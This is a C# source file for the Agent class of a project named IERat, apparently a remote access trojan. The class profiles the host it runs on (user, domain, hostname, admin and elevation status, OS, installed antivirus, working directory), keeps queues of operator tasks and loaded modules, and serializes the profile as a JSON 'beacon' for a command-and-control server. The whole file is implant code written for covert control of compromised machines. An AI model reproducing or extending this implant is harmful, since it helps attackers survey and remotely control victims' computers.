using IERat.lib;
using System;
using System.Collections.Generic;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Web.Script.Serialization;

namespace IERat
{
    public class Agent
    {
        public Agent()
        {
            ID = Guid.NewGuid();
            Username = Environment.UserName;
            Domain = Environment.UserDomainName;
            Hostname = Environment.MachineName;
            LocalAdministrator = IsCurrentUserInAdminGroup().ToString();
            Elevated = IsElevated().ToString();
            OSVersion = Utils.GetOS();
            AV = AVUtils.GetAV();
            AgentTasks = new Queue<TaskObject>();
            CompletedAgentTasks = new Queue<TaskObject>();
            Version = Assembly.GetExecutingAssembly().GetName().Version.ToString();
            Cwd = Directory.GetCurrentDirectory();
            LoadedModules = new Dictionary<String, object>();
        }
        public Guid ID { get; set; }
        public string Username { get; set; }
        public string Domain { get; set; }
        public string Hostname { get; set; }
        public string LocalAdministrator { get; set; }
        public string Elevated { get; set; }
        public string OSVersion { get; set; }
        public string AV { get; set; }
        public string Cwd { get; set; }
        public string Version { get; set; }
        public Queue<TaskObject> AgentTasks { get; set; }
        public Queue<TaskObject> CompletedAgentTasks { get; set; }
        public Dictionary<String, object> LoadedModules { get; set; }

        public string GenerateBeacon()
        {
            return new JavaScriptSerializer().Serialize(this);
        }
        private bool IsCurrentUserInAdminGroup()
        {
            var principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            var claims = principal.Claims;
            return (claims.FirstOrDefault(c => c.Value == "S-1-5-32-544") != null);
        }
        private bool IsElevated()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                .IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}




